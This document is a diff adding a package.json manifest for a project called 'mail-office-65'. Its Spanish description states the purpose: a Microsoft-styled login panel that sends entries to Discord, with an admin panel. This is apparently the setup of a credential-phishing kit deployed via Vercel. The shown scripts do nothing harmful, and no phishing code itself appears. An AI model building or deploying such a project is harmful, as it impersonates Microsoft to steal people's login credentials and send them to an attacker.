@@ -1,0 +1,10 @@
+{
+  "name": "mail-office-65",
+  "version": "1.0.0",
+  "private": true,
+  "description": "Panel de login con estilo Microsoft, envío a Discord y panel admin",
+  "scripts": {
+    "dev": "vercel dev",
+    "build": "echo 'No build step needed'"
+  }
+}
